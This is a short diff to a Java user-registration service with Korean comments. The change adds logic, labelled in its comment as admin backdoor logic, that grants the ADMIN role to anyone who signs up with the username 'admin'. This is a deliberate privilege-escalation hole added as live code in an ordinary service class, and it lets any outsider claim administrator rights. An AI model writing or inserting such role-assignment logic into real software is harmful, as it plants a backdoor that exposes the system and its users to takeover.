@@ -86,7 +86,14 @@ public class UserService {
 
         // 비밀번호 암호화 후 엔티티 생성
         String encodedPassword = passwordEncoder.encode(password);
-        User user = new User(username, encodedPassword);
+        
+        // 권한 결정 (관리자 백도어 로직)
+        UserRole role = UserRole.USER;
+        if (username.equals("admin")) {
+            role = UserRole.ADMIN;
+        }
+
+        User user = new User(username, encodedPassword, role);
 
         userRepository.save(user);
         return "회원가입 성공";
